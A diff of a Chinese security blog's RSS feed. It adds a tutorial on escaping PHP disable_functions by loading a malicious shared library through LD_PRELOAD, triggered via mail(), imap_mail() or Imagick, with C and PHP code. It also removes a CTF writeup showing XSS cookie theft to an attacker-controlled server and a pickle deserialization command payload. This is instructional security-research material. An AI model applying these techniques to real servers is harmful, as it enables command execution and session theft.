@@ -7,8 +7,251 @@
     <generator>Hugo -- gohugo.io</generator>
     <language>zh_cn</language>
     <copyright>Copyright © 2019 kylinking</copyright>
-    <lastBuildDate>Wed, 20 Mar 2019 15:27:20 +0000</lastBuildDate>
+    <lastBuildDate>Tue, 02 Apr 2019 10:21:42 +0000</lastBuildDate>
     <atom:link href="https://kylingit.com/blog/index.xml" rel="self" type="application/rss+xml" />
+    
+    <item>
+      <title>利用LD_PRELOAD绕过disbale_functions</title>
+      <link>https://kylingit.com/blog/%E5%88%A9%E7%94%A8ld_preload%E7%BB%95%E8%BF%87disbale_functions/</link>
+      <pubDate>Tue, 02 Apr 2019 10:21:42 +0000</pubDate>
+      
+      <guid>https://kylingit.com/blog/%E5%88%A9%E7%94%A8ld_preload%E7%BB%95%E8%BF%87disbale_functions/</guid>
+      <description>
+
+&lt;script src=&#34;https://blog-1252261399.cos-website.ap-beijing.myqcloud.com/pangu.js&#34;&gt;&lt;/script&gt;
+
+&lt;h3 id=&#34;0x01-背景&#34;&gt;0x01 背景&lt;/h3&gt;
+
+&lt;p&gt;有时候拿到&lt;code&gt;shell&lt;/code&gt;后发现无法执行系统命令，通过&lt;code&gt;phpinfo&lt;/code&gt;查看发现设置了&lt;code&gt;disbale_functions&lt;/code&gt;，禁止了大部分可以执行命令的方法，这时候就要考虑绕过这个限制。本文是介绍了利用&lt;code&gt;LD_PRELOAD&lt;/code&gt;环境变量加载恶意共享库的方式绕过，当然方式不止文中列出的几种，有何遗漏或不足欢迎提建议。&lt;/p&gt;
+
+&lt;h3 id=&#34;0x02-ld-preload-环境变量&#34;&gt;0x02 LD_PRELOAD 环境变量&lt;/h3&gt;
+
+&lt;blockquote&gt;
+&lt;p&gt;&lt;em&gt;LD_PRELOAD&lt;/em&gt; is an optional environmental variable containing one or more paths to shared libraries, or shared objects, that the loader will load before any other shared library including the C runtime library (&lt;em&gt;libc.so&lt;/em&gt;) This is called preloading a library.&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;根据文档介绍，如果使用&lt;code&gt;LD_PRELOAD&lt;/code&gt;环境变量指定了一个共享库或共享对象，那么这个共享对象会在其他对象加载前被加载，例如&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-shell&#34;&gt;$ LD_PRELOAD=/path/to/my/malloc.so /bin/ls
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;即在执行&lt;code&gt;ls&lt;/code&gt;命令前，会先加载指定路径的&lt;code&gt;malloc.so&lt;/code&gt;文件，如果这是一个恶意共享对象，那么可以执行任意操作。&lt;/p&gt;
+
+&lt;p&gt;我们可以通过&lt;code&gt;readelf&lt;/code&gt;命令查看某个命令调用了哪些外部链接库，然后找到其中某个库，编写同名函数进行劫持，然后编译成共享对象文件，接着使用&lt;code&gt;LD_PRELOAD&lt;/code&gt;环境变量指定生成的对象，达到命令执行的目的。&lt;/p&gt;
+
+&lt;p&gt;一般情况我们选择简单的或者不带参数的命令，例如&lt;code&gt;id&lt;/code&gt;，&lt;code&gt;ls&lt;/code&gt;，&lt;code&gt;whoami&lt;/code&gt;等，另外为了实现原型一致的劫持函数，也尽量选择常用的或者不用传递参数的函数，例如&lt;code&gt;getuid()&lt;/code&gt;，&lt;code&gt;getpid()&lt;/code&gt;，&lt;code&gt;getgid()&lt;/code&gt;等&lt;/p&gt;
+
+&lt;p&gt;以&lt;code&gt;python&lt;/code&gt;为例，通过命令&lt;code&gt;readelf -s /usr/bin/python&lt;/code&gt;列出&lt;code&gt;python&lt;/code&gt;程序调用的系统函数，可以筛选出&lt;code&gt;get&lt;/code&gt;型的函数&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;https://blog-1252261399.cos-website.ap-beijing.myqcloud.com/images/20190402111421.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;尝试劫持&lt;code&gt;getpid()&lt;/code&gt;函数&lt;/p&gt;
+
+&lt;p&gt;首先通过man命令查看&lt;code&gt;getpid()&lt;/code&gt;函数的实现&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;https://blog-1252261399.cos-website.ap-beijing.myqcloud.com/images/20190402111816.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;然后重写&lt;code&gt;getpid()&lt;/code&gt;函数&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-c&#34;&gt;#include &amp;lt;sys/types.h&amp;gt;
+#include &amp;lt;unistd.h&amp;gt;
+
+pid_t getpid(void){
+    system(&amp;quot;echo &#39;pwned by getpid!&#39;&amp;quot;);
+    return 0;
+}
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;&lt;strong&gt;注意：&lt;/strong&gt;因为通过设置&lt;code&gt;preload&lt;/code&gt;劫持了比较底层的函数，而派发出的新进程如果用到该函数也会一并被劫持，也就是说如果没有及时&lt;code&gt;unsetenv(&amp;quot;LD_PRELOAD&amp;quot;)&lt;/code&gt;则会导致不断循环，一旦操作敏感就会比较危险，所以一定要及时删除这个环境变量，改进版如下：&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-c&#34;&gt;#include &amp;lt;sys/types.h&amp;gt;
+#include &amp;lt;unistd.h&amp;gt;
+
+void payload(void){
+    system(&amp;quot;echo &#39;pwned by getpid!&#39;&amp;quot;);
+}
+
+pid_t getpid(void){
+    if (getenv(&amp;quot;LD_PRELOAD&amp;quot;) == NULL){
+        return 0;
+    }
+
+    unsetenv(&amp;quot;LD_PRELOAD&amp;quot;);
+    payload();
+
+    return 0;
+}
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;接着编译共享对象，&lt;code&gt;-shared&lt;/code&gt;表示生成共享库，&lt;code&gt;-fPIC&lt;/code&gt;表示使用地址无关代码&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-shell&#34;&gt;gcc -shared -fPIC getpid.c -o getpid.so
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;&lt;code&gt;LD_PRELOAD&lt;/code&gt;设置加载so文件，运行python，可以看到函数被成功劫持&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;https://blog-1252261399.cos-website.ap-beijing.myqcloud.com/images/20190403104653.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;这个方法有一定限制，首先需要找到一个相对简单的函数原型，然后需要确保该函数被目标程序调用，因此一个更好的方法是利用扩展修饰符修饰函数，优先加载恶意函数，增强通用性，这里就用到了&lt;code&gt;扩展修饰符&lt;/code&gt; &lt;code&gt;__attribute__((constructor))&lt;/code&gt;&lt;/p&gt;
+
+&lt;blockquote&gt;
+&lt;p&gt;GCC 有个 C 语言扩展修饰符 &lt;code&gt;__attribute__((constructor))&lt;/code&gt;，可以让由它修饰的函数在 main() 之前执行，若它出现在共享对象中时，那么一旦共享对象被系统加载，立即将执行 &lt;code&gt;__attribute__((constructor))&lt;/code&gt; 修饰的函数&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;简单说就是&lt;code&gt;__attribute__&lt;/code&gt;可以修饰几个属性，包括函数属性、变量属性和类型属性，语法格式为：&lt;/p&gt;
+
+&lt;p&gt;&lt;code&gt;__attribute__(( attribute-list ))&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;当函数属性被设置为&lt;code&gt;constructor&lt;/code&gt;时，该函数会在可执行文件（或共享对象）加载时被调用，同理当设置属性为&lt;code&gt;destructor&lt;/code&gt;时会在对象&lt;code&gt;unload&lt;/code&gt;时调用，也就是说设置为这两个属性时，会在&lt;code&gt;main()&lt;/code&gt;函数执行之前或者&lt;code&gt;return()&lt;/code&gt;执行之后被调用，我们就可以借助这个扩展修饰符，当加载so文件时自动执行恶意函数，这样就不局限于某个特定函数，使用面大大扩展了&lt;/p&gt;
+
+&lt;p&gt;重新写一个函数，使用 &lt;code&gt;__attribute__((constructor))&lt;/code&gt;修饰&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-c&#34;&gt;#include &amp;lt;unistd.h&amp;gt;
+
+void payload(void){
+    system(&amp;quot;echo &#39;pwned!&#39;&amp;quot;);
+}
+
+__attribute__ ((__constructor__)) void exec(void){
+    if (getenv(&amp;quot;LD_PRELOAD&amp;quot;) == NULL){
+        return;
+    }
+
+    unsetenv(&amp;quot;LD_PRELOAD&amp;quot;);
+    payload();
+
+    return;
+}
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;重新编译并加载，成功执行&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;https://blog-1252261399.cos-website.ap-beijing.myqcloud.com/images/20190402154051.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+
+&lt;h3 id=&#34;0x03-绕过-disable-functions&#34;&gt;0x03 绕过&lt;code&gt;disable_functions&lt;/code&gt;&lt;/h3&gt;
+
+&lt;p&gt;接下来看一下怎么利用&lt;code&gt;LD_PRELOAD&lt;/code&gt;在&lt;code&gt;php&lt;/code&gt;启用&lt;code&gt;disable_functions&lt;/code&gt;禁用了命令/代码执行函数的情况下绕过这个限制，达到命令执行的效果&lt;/p&gt;
+
+&lt;p&gt;&lt;code&gt;php.ini&lt;/code&gt;限制大部分执行命令的函数&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-ini&#34;&gt;disable_functions = assert,system,passthru,exec,pcntl_exec,shell_exec,popen,proc_open
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;根据上面的介绍，我们突破&lt;code&gt;disable_functions&lt;/code&gt;的步骤如下&lt;/p&gt;
+
+&lt;ol&gt;
+&lt;li&gt;编写恶意C函数，并编译成共享对象；&lt;/li&gt;
+&lt;li&gt;在&lt;code&gt;php&lt;/code&gt;执行过程中找到一个函数，这个函数能够产生一个新的进程；&lt;/li&gt;
+&lt;li&gt;通过&lt;code&gt;putenv&lt;/code&gt;设置&lt;code&gt;LD_PRELOAD&lt;/code&gt;环境变量，使得新产生的进程优先加载恶意共享对象；&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;p&gt;第1步在上文已经解决了，第3步也比较容易实现，关键就是第2步，找到一个&lt;code&gt;php&lt;/code&gt;中可以新起一个进程的函数，目的是为了让这个新进程使用的环境变量加载我们设置的恶意共享对象，达到劫持的目的&lt;/p&gt;
+
+&lt;p&gt;在&lt;code&gt;php&lt;/code&gt;中有这么几个函数可以被利用，&lt;code&gt;mail()&lt;/code&gt;，&lt;code&gt;imap_mail()&lt;/code&gt;，以及&lt;code&gt;Imagick&lt;/code&gt;，来逐一测试&lt;/p&gt;
+
+&lt;h4 id=&#34;mail&#34;&gt;mail()&lt;/h4&gt;
+
+&lt;p&gt;&lt;code&gt;mail()&lt;/code&gt;函数会启动&lt;code&gt;sendmail&lt;/code&gt;进程发送邮件，这个过程是可以被劫持的&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;&amp;lt;?php
+    mail(&amp;quot;admin@localhost&amp;quot;,&amp;quot;&amp;quot;,&amp;quot;&amp;quot;,&amp;quot;&amp;quot;,&amp;quot;&amp;quot;);
+?&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;通过&lt;code&gt;strace&lt;/code&gt;查看&lt;code&gt;mail()&lt;/code&gt;函数调用的过程&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;https://blog-1252261399.cos-website.ap-beijing.myqcloud.com/images/20190402180420.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;可以看到除了&lt;code&gt;php&lt;/code&gt;自身进程外还启动了&lt;code&gt;sendmail&lt;/code&gt;进程，而&lt;code&gt;sendmail&lt;/code&gt;在执行过程中调用了多个可以被劫持的函数，例如&lt;code&gt;getuid&lt;/code&gt;，&lt;code&gt;getgid&lt;/code&gt;， &lt;code&gt;getpid&lt;/code&gt;等，我们还是以上面的&lt;code&gt;getpid&lt;/code&gt;为例测试&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;https://blog-1252261399.cos-website.ap-beijing.myqcloud.com/images/20190403103643.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;通过&lt;code&gt;putenv&lt;/code&gt;将&lt;code&gt;LD_PRELOAD&lt;/code&gt;环境变量设置为上面编译好的&lt;code&gt;getpid.so&lt;/code&gt;&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;&amp;lt;?php
+    putenv(&amp;quot;LD_PRELOAD=/tmp/getpid.so&amp;quot;);
+    mail(&amp;quot;admin@localhost&amp;quot;,&amp;quot;&amp;quot;,&amp;quot;&amp;quot;,&amp;quot;&amp;quot;,&amp;quot;&amp;quot;);
+?&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;&lt;img src=&#34;https://blog-1252261399.cos-website.ap-beijing.myqcloud.com/images/20190403104908.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;成功绕过&lt;code&gt;disable_functions&lt;/code&gt;限制。另外也可以用&lt;code&gt;__attribute__ ((__constructor__))&lt;/code&gt;修饰函数，这样就不局限于某个系统函数。&lt;/p&gt;
+
+&lt;h4 id=&#34;imap-mail&#34;&gt;imap_mail()&lt;/h4&gt;
+
+&lt;p&gt;&lt;code&gt;imap_mail()&lt;/code&gt;函数与&lt;code&gt;mail()&lt;/code&gt;函数类似，都会调用&lt;code&gt;sendmail&lt;/code&gt;程序发送邮件，因此也能通过&lt;code&gt;LD_PRELOAD&lt;/code&gt;环境变量绕过，方法同上&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;https://blog-1252261399.cos-website.ap-beijing.myqcloud.com/images/20190403141357.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+
+&lt;h4 id=&#34;imagick&#34;&gt;Imagick&lt;/h4&gt;
+
+&lt;p&gt;&lt;code&gt;Imagick&lt;/code&gt;作为使用广泛的图形处理库，它在处理各种类型的文件时会调用不同的处理程序，这个过程也是可以进行劫持的，常见的文件类型与处理程序对应关系列举如下&lt;/p&gt;
+
+&lt;table&gt;
+&lt;thead&gt;
+&lt;tr&gt;
+&lt;th&gt;文件类型&lt;/th&gt;
+&lt;th&gt;调用程序&lt;/th&gt;
+&lt;/tr&gt;
+&lt;/thead&gt;
+
+&lt;tbody&gt;
+&lt;tr&gt;
+&lt;td&gt;EPI/EPS/PDF/PS&lt;/td&gt;
+&lt;td&gt;&lt;a href=&#34;http://www.cs.wisc.edu/~ghost&#34;&gt;Ghostscript&lt;/a&gt;&lt;/td&gt;
+&lt;/tr&gt;
+
+&lt;tr&gt;
+&lt;td&gt;MNG/M2V&lt;/td&gt;
+&lt;td&gt;&lt;a href=&#34;http://www.ffmpeg.org/download.html&#34;&gt;ffmpeg&lt;/a&gt;&lt;/td&gt;
+&lt;/tr&gt;
+
+&lt;tr&gt;
+&lt;td&gt;JXR&lt;/td&gt;
+&lt;td&gt;&lt;a href=&#34;https://jxrlib.codeplex.com/&#34;&gt;jxrlib&lt;/a&gt;&lt;/td&gt;
+&lt;/tr&gt;
+&lt;/tbody&gt;
+&lt;/table&gt;
+
+&lt;p&gt;详细的依赖调用关系可以参考&lt;a href=&#34;https://imagemagick.org/script/formats.php&#34;&gt;官方网站&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;以&lt;code&gt;eps&lt;/code&gt;文件为例，使用&lt;code&gt;Imagick&lt;/code&gt;加载&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;&amp;lt;?php
+    $a = new Imagick(&amp;quot;/tmp/payload.eps&amp;quot;);
+?&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;如果出现报错&lt;/p&gt;
+
+&lt;p&gt;&lt;code&gt;Uncaught ImagickException: not authorized &#39;payload.eps&#39;&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;需要修改&lt;code&gt;imagick&lt;/code&gt;的&lt;code&gt;policy.xml&lt;/code&gt;文件，把相应文件类型的权限修改为&lt;code&gt;read|write&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;https://blog-1252261399.cos-website.ap-beijing.myqcloud.com/images/20190403151458.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;通过&lt;code&gt;strace&lt;/code&gt;可以看到启动了&lt;code&gt;gs&lt;/code&gt;程序处理&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;https://blog-1252261399.cos-website.ap-beijing.myqcloud.com/images/20190403152424.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;因此我们同样可以通过修改&lt;code&gt;LD_PRELOAD&lt;/code&gt;达到执行代码的目的，而实际上这个过程并不要求&lt;code&gt;payload.eps&lt;/code&gt;是个合法的&lt;code&gt;eps&lt;/code&gt;文件&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;https://blog-1252261399.cos-website.ap-beijing.myqcloud.com/images/20190403153255.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;类似的，&lt;code&gt;pdf&lt;/code&gt;、&lt;code&gt;ps&lt;/code&gt;、&lt;code&gt;wmv&lt;/code&gt;文件等，都可以通过这个方法利用。&lt;/p&gt;
+
+&lt;h3 id=&#34;0x04-总结&#34;&gt;0x04 总结&lt;/h3&gt;
+
+&lt;p&gt;本文主要介绍了如何利用&lt;code&gt;LD_PRELOAD&lt;/code&gt;突破&lt;code&gt;disbale_functions&lt;/code&gt;，当然这个方法也有一个限制，那就是&lt;code&gt;putenv&lt;/code&gt;没有被禁用，得以设置环境变量，因此在不影响系统运行的前提下也需要把&lt;code&gt;putenv&lt;/code&gt;加上。&lt;/p&gt;
+
+&lt;p&gt;参考：&lt;/p&gt;
+
+&lt;p&gt;&lt;a href=&#34;https://www.one-tab.com/page/sF_C-HRZTTGu-K_bDaSLoQ&#34;&gt;https://www.one-tab.com/page/sF_C-HRZTTGu-K_bDaSLoQ&lt;/a&gt;&lt;/p&gt;
+
+&lt;script&gt;pangu.spacingPage();&lt;/script&gt;
+</description>
+    </item>
     
     <item>
       <title>对PHP中的mkdir()函数的研究</title>
@@ -158,7 +401,7 @@
 
 &lt;h3 id=&#34;0x05-深入&#34;&gt;0x05 深入&lt;/h3&gt;
 
-&lt;p&gt;现在清楚了&lt;code&gt;php&lt;/code&gt;对&lt;code&gt;mkdir()&lt;/code&gt;的实现，之所以结果不一样是因为&lt;code&gt;ZTS&lt;/code&gt;与&lt;code&gt;NTS&lt;/code&gt;下的两种不同的处理流程，那么为什么在TS模式下，在调用&lt;code&gt;Windows&lt;/code&gt;的&lt;code&gt;API&lt;/code&gt;创建目录之前，需要设置一个“虚拟目录”呢？&lt;/p&gt;
+&lt;p&gt;现在清楚了&lt;code&gt;php&lt;/code&gt;对&lt;code&gt;mkdir()&lt;/code&gt;的实现，之所以结果不一样是因为&lt;code&gt;ZTS&lt;/code&gt;与&lt;code&gt;NTS&lt;/code&gt;下的两种不同的处理流程，那么为什么在&lt;code&gt;ZTS&lt;/code&gt;模式下，在调用&lt;code&gt;Windows&lt;/code&gt;的&lt;code&gt;API&lt;/code&gt;创建目录之前，需要设置一个“虚拟目录”呢？&lt;/p&gt;
 
 &lt;p&gt;这里涉及到&lt;code&gt;php&lt;/code&gt;内核中的&lt;code&gt;TSRM&lt;/code&gt;机制，也就是&lt;code&gt;线程安全资源管理器(Thread Safe Resource Manager)&lt;/code&gt; ，这个机制的引入是为了解决线程并发的问题，我们知道，如果线程访问的内存地址空间相同，当一个线程修改资源时会影响其它线程，所以为了确保不会出现资源竞争，&lt;code&gt;php&lt;/code&gt;将多个资源复制为多份，每个线程需要的资源在当前进程空间中各有一份，各取所取，这样就不会出现竞争问题。&lt;/p&gt;
 
@@ -185,6 +428,8 @@
 &lt;p&gt;参考：&lt;/p&gt;
 
 &lt;p&gt;&lt;a href=&#34;http://php.net/manual/en/function.mkdir.php&#34;&gt;http://php.net/manual/en/function.mkdir.php&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;a href=&#34;http://blog.codinglabs.org/articles/zend-thread-safety.html&#34;&gt;http://blog.codinglabs.org/articles/zend-thread-safety.html&lt;/a&gt;&lt;/p&gt;
 
 &lt;p&gt;&lt;a href=&#34;https://segmentfault.com/a/1190000010004035&#34;&gt;https://segmentfault.com/a/1190000010004035&lt;/a&gt;&lt;/p&gt;
 
@@ -3549,247 +3794,6 @@ protected MultiValueMap&amp;lt;String, String&amp;gt; findSubscriptionsInternal(
 &lt;li&gt;&lt;a href=&#34;http://blog.nsfocus.net/spring-messaging-analysis/&#34;&gt;http://blog.nsfocus.net/spring-messaging-analysis/&lt;/a&gt;&lt;/li&gt;
 &lt;li&gt;&lt;a href=&#34;https://www.anquanke.com/post/id/104140&#34;&gt;https://www.anquanke.com/post/id/104140&lt;/a&gt;&lt;/li&gt;
 &lt;/ul&gt;
-</description>
-    </item>
-    
-    <item>
-      <title>第二届强网杯Web部分 Writeup</title>
-      <link>https://kylingit.com/blog/%E7%AC%AC%E4%BA%8C%E5%B1%8A%E5%BC%BA%E7%BD%91%E6%9D%AFweb%E9%83%A8%E5%88%86-writeup/</link>
-      <pubDate>Tue, 27 Mar 2018 18:06:02 +0000</pubDate>
-      
-      <guid>https://kylingit.com/blog/%E7%AC%AC%E4%BA%8C%E5%B1%8A%E5%BC%BA%E7%BD%91%E6%9D%AFweb%E9%83%A8%E5%88%86-writeup/</guid>
-      <description>
-
-&lt;p&gt;强网杯Web部分的题难度不小，还是比较有意思的，收获很大，这里简单分析一下其中两道题&lt;/p&gt;
-
-&lt;h3 id=&#34;share-your-mind&#34;&gt;Share your mind&lt;/h3&gt;
-
-&lt;pre&gt;&lt;code&gt;http://39.107.33.96:20000
-Please help me find the vulnerability before I finish this site！
-hint：xss bot使用phantomjs，版本2.1.1
-hint2 : xss的点不在report页面
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;根据writeup描述，这是一道RPO攻击的题目，以前没接触过，趁机学习一波&lt;/p&gt;
-
-&lt;p&gt;首先注册用户登录，查看源码，最后几行，可以看到引用js的时候这里使用了相对路径，构成RPO攻击的条件，简单尝试几个url发现确实可以利用。&lt;/p&gt;
-
-&lt;p&gt;RPO攻击的原理可以参考&lt;/p&gt;
-
-&lt;p&gt;&lt;a href=&#34;https://www.cnblogs.com/iamstudy/articles/ctf_writeup_rpo_attack.html&#34;&gt;https://www.cnblogs.com/iamstudy/articles/ctf_writeup_rpo_attack.html&lt;/a&gt;&lt;/p&gt;
-
-&lt;p&gt;&lt;a href=&#34;http://blog.nsfocus.net/rpo-attack/&#34;&gt;http://blog.nsfocus.net/rpo-attack/&lt;/a&gt;&lt;/p&gt;
-
-&lt;p&gt;访问&lt;code&gt;http://39.107.33.96:20000/index.php/view/article/1226&lt;/code&gt;的时候加载&lt;code&gt;jquery.min.js&lt;/code&gt;的路径可以看到是正常的，&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&#34;https://blog-1252261399.cos-website.ap-beijing.myqcloud.com/images/oHZtz&#34; alt=&#34;jquery.js&#34; /&gt;
-当访问&lt;code&gt;http://39.107.33.96:20000/index.php/view/article/1226/..%2f..%2f..%2f..%2findex.php&lt;/code&gt;的时候浏览器尝试加载&lt;code&gt;..%2f..%2f..%2f..%2findex.php/static/js/jquery.min.js&lt;/code&gt;这个数据，而服务端则往上读取三层路径，加载的是article的页面，如果article页面存在xss的话就会被加载，题目也正好满足要求，所以我们创建一篇文章写入获取cookie的js,利用这个url让服务器请求这篇文章，弹给我们cookie&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&#34;https://blog-1252261399.cos-website.ap-beijing.myqcloud.com/images/pa5qf&#34; alt=&#34;jquery.js&#34; /&gt;&lt;/p&gt;
-
-&lt;p&gt;因为页面对一些特殊符号做了编码过滤，所以我们使用&lt;code&gt;String.fromCharCode()&lt;/code&gt;方法从ascii码来加载js&lt;/p&gt;
-
-&lt;pre&gt;&lt;code&gt;window.location.href=String.fromCharCode(some ascii code) + document.cookie;
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;&lt;img src=&#34;https://blog-1252261399.cos-website.ap-beijing.myqcloud.com/images/SVQMd&#34; alt=&#34;md5&#34; /&gt;
-这里有两个点的绕过：&lt;/p&gt;
-
-&lt;ul&gt;
-&lt;li&gt;url部分做了同站检测，通过&lt;code&gt;http://39.107.33.96:20000@x.x.x.x&lt;/code&gt;的形式绕过&lt;/li&gt;
-&lt;li&gt;这里的code每次刷新都是随机的，而且通过&lt;code&gt;===&lt;/code&gt;比较，没法通过弱类型绕过，所以我们生成所有6位字符的MD5，搜索前6位符合条件的就行(实际上生成了大约200M的文件基本够用了)&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;p&gt;根据提示要访问&lt;code&gt;/QWB_fl4g/QWB/&lt;/code&gt;页面，所以我们在vps上建一个带iframe的页面&lt;/p&gt;
-
-&lt;pre&gt;&lt;code&gt;&amp;lt;img src=&#39;http://39.107.33.96:20000/QWB_fl4g/QWB/index.php&#39;&amp;gt;  
-&amp;lt;iframe src=&#39;http://39.107.33.96:20000/QWB_fl4g/QWB/index.php/..%2f..%2f../index.php/view/article/1462/..%2f..%2f..%2f..%2findex.php&#39;&amp;gt;&amp;lt;/iframe&amp;gt;
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;nc监听端口，xssbot会先访问&lt;code&gt;/QWB_fl4g/QWB/index.php&lt;/code&gt;，带上cookie后再访问article，触发xss，我们就能收到cookie&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&#34;https://blog-1252261399.cos-website.ap-beijing.myqcloud.com/images/yDw2L&#34; alt=&#34;flag&#34; /&gt;&lt;/p&gt;
-
-&lt;h3 id=&#34;python-is-the-best-language-2&#34;&gt;python is the best language #2&lt;/h3&gt;
-
-&lt;p&gt;考点：session处存在反序列化漏洞&lt;/p&gt;
-
-&lt;p&gt;&lt;code&gt;app/others.py&lt;/code&gt; &lt;code&gt;FilterException&lt;/code&gt;类&lt;code&gt;load&lt;/code&gt;方法存在反序列化漏洞&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;class FilterException(Exception):
-
-    def __init__(self, value):
-        super(FilterException, self).__init__(
-            &#39;the callable object {value} is not allowed&#39;.format(value=str(value)))
-
-
-def _hook_call(func):
-    def wrapper(*args, **kwargs):
-        print args[0].stack
-        if args[0].stack[-2] in black_type_list:
-            raise FilterException(args[0].stack[-2])
-        return func(*args, **kwargs)
-    return wrapper
-
-
-def load(file):
-    unpkler = Unpkler(file)
-    unpkler.dispatch[REDUCE] = _hook_call(unpkler.dispatch[REDUCE])
-    return Unpkler(file).load()
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;先测试一下序列化与反序列化过程可能产生的安全问题&lt;/p&gt;
-
-&lt;ul&gt;
-&lt;li&gt;序列化&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;import os
-from pickle import Pickler
-
-class test(object):
-    def __reduce__(self):
-        return (os.system, (&#39;whoami&#39;))
-evil = test()
-
-def dump(file):
-    pk = Pickler(file)
-    pk.dump(evil)
-
-with open(&#39;test&#39;, &#39;wb&#39;) as f:
-    dump(f)
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;会将python对象序列化成字符串写入文件，类似这个样子&lt;/p&gt;
-
-&lt;pre&gt;&lt;code&gt;cnt
-system
-p0
-(S&#39;whoami&#39;
-p1
-tp2
-Rp3
-.
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;ul&gt;
-&lt;li&gt;反序列化&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pickle import Unpickler
-
-def load(file):
-    return Unpickler(file).load()
-
-with open(&#39;test&#39;, &#39;rb&#39;) as f:
-    load(f)
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;从文件读取进行反序列化，如果含有可执行的命令就会执行&lt;/p&gt;
-
-&lt;p&gt;题目中对一些系统命令加入了黑名单，没法直接使用，但是这里可以用&lt;code&gt;subprocess&lt;/code&gt;、&lt;code&gt;commands&lt;/code&gt;等，同样是执行系统命令&lt;/p&gt;
-
-&lt;p&gt;&lt;code&gt;load()&lt;/code&gt;方法并没有对传入的&lt;code&gt;file&lt;/code&gt;进行任何过滤，就会导致反序列化漏洞&lt;/p&gt;
-
-&lt;p&gt;全局搜索一下调用&lt;code&gt;load()&lt;/code&gt;方法的部分&lt;/p&gt;
-
-&lt;p&gt;&lt;code&gt;app/Mycache.py&lt;/code&gt;
-&lt;code&gt;get()&lt;/code&gt;方法&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;def get(self, key):
-    filename = self._get_filename(key)
-    try:
-        with open(filename, &#39;rb&#39;) as f:
-            pickle_time = load(f)
-            if pickle_time == 0 or pickle_time &amp;gt;= time():
-                a = load(f)
-                return a
-            else:
-                os.remove(filename)
-                return None
-    except (IOError, OSError, PickleError):
-        return None
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;传入filename进行了load，跟进&lt;code&gt;_get_filename()&lt;/code&gt;方法&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;def _get_filename(self, key):
-    if isinstance(key, text_type):
-        key = key.encode(&#39;utf-8&#39;)  # XXX unicode review
-    hash = md5(key).hexdigest()
-    return os.path.join(self._path, hash)
